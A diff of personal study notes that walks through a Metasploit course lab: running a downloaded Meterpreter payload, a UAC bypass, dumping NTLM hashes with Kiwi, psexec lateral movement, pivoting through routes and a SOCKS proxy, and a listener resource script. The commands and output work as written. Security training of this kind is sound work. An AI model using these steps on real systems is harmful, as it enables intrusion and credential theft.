@@ -2529,10 +2642,12 @@ iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
 PS C:\Users\luiza> .\met.exe
 .\met.exe
 PS C:\Users\luiza>
+
 ```
 
 Return to our multi/handler.
 ```
+
 msf6 exploit(multi/handler) > run
 
 [*] Started HTTPS reverse handler on https://192.168.45.182:443
@@ -2564,6 +2679,7 @@ meterpreter > migrate 7092
 [*] Migration completed successfully.
 meterpreter > getuid
 Server username: ITWK01\offsec
+
 ```
 - We are now running in the context of `offsec`
 
@@ -2573,6 +2689,7 @@ To diplay the integrity level of a proc, we can use tools such as [Process Explo
 
 Once we import the module with [Import-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2) we use `Get-NtTokenIntegrityLevel` to display the integrity level of the current proc by retrieving and reviewing the assigned access token.
 ```
+
 meterpreter > shell
 Process 1512 created.
 Channel 1 created.
@@ -2591,19 +2708,23 @@ Import-Module NtObjectManager
 PS C:\Windows\system32> Get-NtTokenIntegrityLevel
 Get-NtTokenIntegrityLevel
 Medium
+
 ```
 - We are operating in the context of integrity level Medium.
 
 Next we background the currently active channel and session to search for UAC post modules to leverage.
 ```powershell
+
 PS C:\Windows\system32> ^Z
 Background channel 1? [y/N]  y
 meterpreter > bg
 [*] Backgrounding session 2...
+
 ```
 
 Search for UAC bypass modules.
 ```
+
 msf6 exploit(multi/handler) > search UAC
 
 Matching Modules
@@ -2632,6 +2753,7 @@ Matching Modules
 
 
 Interact with a module by name or index. For example info 17, use 17 or use exploit/windows/local/bypassuac_sluihijack
+
 ```
 - The search yields a few results.
  - And effective UAC bypass on moder Win sys is `exploit/windows/local/bypassuac_sdclt`
@@ -2640,6 +2762,7 @@ Interact with a module by name or index. For example info 17, use 17 or use expl
 
 To use the mod we activate it and set the `SESSION` and `LHOST` options.  Setting the SESSION for a post mod allows us to directly exec the exploit on the active session.  Enter `run` to launch the module.
 ```
+
 msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt 
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/local/bypassuac_sdclt) > show options 
@@ -2703,11 +2826,13 @@ msf6 exploit(windows/local/bypassuac_sdclt) > run
 [*] Registry Changes Removed
 
 meterpreter >
+
 ```
 - Our UAC bypass post module created a new Meterpreter session.
 
 Let's check the integrity level of the proc as we did before.
 ```
+
 meterpreter > shell
 Process 7540 created.
 Channel 1 created.
@@ -2726,6 +2851,7 @@ Import-Module NtObjectManager
 PS C:\Windows\system32> Get-NtTokenIntegrityLevel
 Get-NtTokenIntegrityLevel
 High
+
 ```
 - The proc of our payload runs in has the integrity level High and we have therefore bypassed UAC.
 
@@ -2733,6 +2859,7 @@ Besides being able to BG the active session and execute module through it, we ca
 
 A great example is Kiwi, which is a Meterpreter extension providing Mimikatz capabilities.  Mimikatz requires SYSTEM, let's exit the current Meterpreter session, start the listener again, and exe `met.exe` as user `luiza` in the bind shell then enter `getsystem`.
 ```
+
 msf6 exploit(multi/handler) > run
 
 [*] Started HTTPS reverse handler on https://192.168.45.182:443
@@ -2742,10 +2869,12 @@ msf6 exploit(multi/handler) > run
 
 meterpreter > getsystem
 ...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+
 ```
 
 Enter `load` with `kiwi` as arg to load the Kiwi mod and use `help` to display the commands of the Kiwi module.  Use `creds_msv` to retrieve LM and NTLM creds.
 ```
+
 meterpreter > load kiwi
 Loading extension kiwi...
   .#####.   mimikatz 2.2.0 20191125 (x64/windows)
@@ -2808,6 +2937,7 @@ luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642
                                                     0d837
 offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb3819546426c2f6bd
                                                     80bbd
+
 ```
 - We successfully retrieve the NTLM has of `luiza`
 
@@ -2817,6 +2947,7 @@ The ability to pivot from on target to another is vital.  In Port Redirection an
 
 As we did previously, we'll connect to a bind shell on port 4444 of machine ITWK01.  Assume we are currently gathering info on the target, we identify a second network interface.
 ```bash
+
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ nc $IT 4444
 Microsoft Windows [Version 10.0.22000.1219]
@@ -2843,11 +2974,13 @@ Ethernet adapter Ethernet1:
    IPv4 Address. . . . . . . . . . . : 172.16.132.199
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . :
+
 ```
 - The second interface has IP `172.16.132.199` assigned.
 
 We can attempt to identify live hosts on this second iface leveraging methods from active information gathering.  Before doing so let's start a Meterpreter shell on our compromised host by downloading and executing `met.exe` as well as starting the multi/handler.
 ```
+
 msf6 exploit(multi/handler) > run
 
 [*] Started HTTPS reverse handler on https://192.168.45.182:443
@@ -2856,10 +2989,12 @@ msf6 exploit(multi/handler) > run
 [*] Meterpreter session 5 opened (192.168.45.182:443 -> 192.168.247.223:52558) at 2023-11-24 13:33:08 -0800
 
 meterpreter >
+
 ```
 
 Now that we have a session on the target sys, we can background it.  To add a route to a network reachable through a compromised host we use `route add` with the network information and session ID the route applies to.  After adding the route we can display routes with `route print`.
 ```
+
 meterpreter > bg
 [*] Backgrounding session 5...
 msf6 exploit(multi/handler) > route add 172.16.132.0/24 5
@@ -2874,11 +3009,13 @@ IPv4 Active Routing Table
    172.16.132.0       255.255.255.0      Session 5
 
 [*] There are currently no IPv6 routes defined.
+
 ```
 - With a path to the internal subnet we can enumerate.
 
 We could scan the the whole network for live hosts with a port scan aux mod.  This would take some time to complete so we will shorted this step by scanning the only live host in the second network.  Instead of setting the value of `RHOSTS` to `172.16.132.0/24` as we would when scanning the whole network, we will set it to `172.16.132.200`.  For now we will only scan ports 445 and 3389.
 ```
+
 msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
 msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.132.200
 RHOSTS => 172.16.132.200
@@ -2890,6 +3027,7 @@ msf6 auxiliary(scanner/portscan/tcp) > run
 [+] 172.16.132.200:       - 172.16.132.200:3389 - TCP OPEN
 [*] 172.16.132.200:       - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
+
 ```
 - Shows that 172.16.132.200 has ports 445 and 3389 open.
 - Let's use two mods for SMB and RDP using out pivot host ITWK01 to perform operations on the target.
@@ -2900,6 +3038,7 @@ Let's us `exploit/windows/smb/psexec` and set `SMBUser` to `luiza`, `SMBPass` to
 
 Note that the added route will only work with established connections, so the new shell on the target must be a bind shell such as `windows/x64/meterpreter/bind_tcp` allowing us to use the set route to connect to it.  A reverse shell payload would not be able to route back to our attacking sys because the target does not have a route defined for our network.
 ```
+
 msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec 
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/psexec) > show options
@@ -2960,10 +3099,12 @@ msf6 exploit(windows/smb/psexec) > set LPORT 8000
 LPORT => 8000
 msf6 exploit(windows/smb/psexec) > set LHOST 192.168.45.182
 LHOST => 192.168.45.182
+
 ```
 
 With our options set we can launch the module.
 ```
+
 msf6 exploit(windows/smb/psexec) > run
 
 [*] 172.16.132.200:445 - Connecting to the server...
@@ -2976,6 +3117,7 @@ msf6 exploit(windows/smb/psexec) > run
 [*] Meterpreter session 6 opened (172.16.132.199:52880 -> 172.16.132.200:8000 via session 5) at 2023-11-24 14:56:33 -0800
 
 meterpreter >
+
 ```
 - Psexec exploit succeeded in obtaining a Meterpreter shell on the second target via the compromised machine.
 
@@ -2983,6 +3125,7 @@ An alternative to adding routes manually is to use the post mod `autoroute` to s
 
 Now the only session is the Meterpreter session created with `met.exe` as user `luiza`.  The result of `route print` states that no routes are defined.  Next we activate mod `multi/manage/autoroute` in which we have to set the session ID as value for the option `SESSION`, then `run` to launch the module.
 ```
+
 msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute
 msf6 post(multi/manage/autoroute) > show options
 
@@ -3033,11 +3176,13 @@ IPv4 Active Routing Table
    192.168.247.0      255.255.255.0      Session 5
 
 [*] There are currently no IPv6 routes defined.
+
 ```
 - Shows autoroute added 172.16.132.0/24 to routing table.
 
 We can now use the psexec module as we did before, we can also combine routes with the `server/socks_proxy` aux mod to configure a SOCKS proxy.  This allows applications outside of MSF to tunnel through the pivot on port 1080 by default.  Set the option `SRVHOST` to `127.0.0.1` and `VERSION` to `5` for SOCKS5.
 ```
+
 msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy 
 msf6 auxiliary(server/socks_proxy) > show options
 
@@ -3078,11 +3223,13 @@ msf6 auxiliary(server/socks_proxy) > run -j
 [*] Auxiliary module running as background job 0.
 msf6 auxiliary(server/socks_proxy) > 
 [*] Starting the SOCKS proxy server
+
 ```
 - We can now update our proxychains conf to utilize the SOCKS5 proxy.
 
 We can now use `proxychains` to run `xfreerdp` to obtain GUI access from our Kali sys to target on internal network.
 ```
+
 ### --- Increase socket timout of proxychains ---
 
 ┌──(operator@labhost)-[~/OffSec/msf]
@@ -3096,12 +3243,14 @@ tcp_connect_time_out 30000
 
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ sudo proxychains xfreerdp /v:172.16.128.200 /u:luiza
+
 ```
 - Increase socket timeout if proxy conn fails.
 - We have successfully pivoted through compromised host.
 
 We can use a similar technique for port forwarding with the `portfwd` command within the Meterpreter session, which forwards a port to the internal network.
 ```
+
 msf6 auxiliary(server/socks_proxy) > sessions  -i 42
 [*] Starting interaction with 42...
 
@@ -3118,18 +3267,23 @@ OPTIONS:
     -p   Forward: remote port to connect to. Reverse: remote port to listen on.
     -r   Forward: remote host to connect to.
     -R   Indicates a reverse port forward.
+
 ```
 
 We create a local port forward from 4389 localhost to 3389 of the target host.
 ```
+
 meterpreter > portfwd add -l 4389 -p 3389 -r 172.16.128.200
 [*] Forward TCP relay created: (local) :4389 -> (remote) 172.16.128.200:3389
+
 ```
 
 We can test by connecting to `127.0.0.1:4389` with `xfreerdp`.
 ```bash
+
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ xfreerdp /v:127.0.0.1:4389 /u:luiza /timeout:20000
+
 ```
 
 #### 20.4 Automating Metasploit
@@ -3147,35 +3301,46 @@ Let's create a script that starts a multi/handler listener for a non-staged Win 
 
 We first need to determine the command sequence we want to use.  In this example, the first command activates the multi/handler module.  Next we set the payload, `windows/meterpreter_reverse_https`, the we set our `LHOST` and `LPORT` options.
 ```
+
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter_reverse_https
 set LHOST 192.168.119.4
 set LPORT 443
+
 ```
 
 Additionally we can configure the `AutoRunScript` option to automatically exec a mod after a session is created.  In this example we will use `post/windows/manage/migrate` module.  This will cause the spawned Meterpreter to automatically launch a background `notepad.exe` process to migrate to.  Automating process migration helps to avoid situations where our payload is killed prematurely by defensive technology or termination of the process.
 ```
+
 set AutoRunScript post/windows/manage/migrate
+
 ```
 
 We also set `ExitOnSession` to `false` to ensure that the listener keeps accepting new connections after a session is created.
 ```
+
 set ExitOnSession false
+
 ```
 *We can also configure advanced options such as ExitOnSession in multi/handler and AutoRunScript in payloads by using show advanced within the activated module or selected payload.*
 
 Finally we add `run` with args `-z -j` to run it as a job in the bg and stop us from automatically interacting with the session.
 ```
+
 run -z -j
+
 ```
 
 Save the script and start Metasploit by passing the resource script as arg for `-r`.
 ```bash
+
 sudo msfconsole -r listener.rc
+
 ```
 
 Or import it into a running session.
 ```
+
 msf6 > resource listener.rc 
 [*] Processing /home/operator/OffSec/msf/listener.rc for ERB directives.
 resource (/home/operator/OffSec/msf/listener.rc)> use exploit/multi/handler
@@ -3195,11 +3360,13 @@ resource (/home/operator/OffSec/msf/listener.rc)> run -z -j
 [*] Exploit completed, but no session was created.
 
 [*] Started HTTPS reverse handler on https://192.168.45.207:443
+
 ```
 - All of our commands were executed from the script.
 
 let's connect to BRUTE2 via RDP with user `justin` and password `SuperS3cure1337#`, start PowerShell, download our mal Win bin `met.exe` that we used previously.
 ```
+
 [!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
 [*] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Redirecting stageless connection from /FNYmHRbQWmG7KLoq3kt59QhAdFPJvMnkV2S9mtqTtNlFmz-DxmF6tOosWU1xpKfaFFO2HoI6fTmcJJ8YS with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'
 [!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
@@ -3213,11 +3380,13 @@ let's connect to BRUTE2 via RDP with user `justin` and password `SuperS3cure1337
 [*] Migrating into 5752
 [+] Successfully migrated into process 5752
 [*] Meterpreter session 44 opened (192.168.45.207:443 -> 192.168.205.202:60820) at 2023-11-26 14:13:55 -0800
+
 ```
 - Metasploit automatically migrated the session to the newly spawned process.
 
 Instead of creating our own resource scripts we can use the scripts provided by Metasploit found in `/usr/share/metasploit-framework/scripts/resource`.
 ```bash
+
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ ls -l /usr/share/metasploit-framework/scripts/resource
 total 156
@@ -3249,6 +3418,7 @@ total 156
 -rw-r--r-- 1 root root  3084 Aug 24 03:07 smb_checks.rc
 -rw-r--r-- 1 root root  3837 Aug 24 03:07 smb_validate.rc
 -rw-r--r-- 1 root root  2592 Aug 24 03:07 wmap_autotest.rc
+
 ```
 - There are resource scripts provided for.
  - Port scanning.
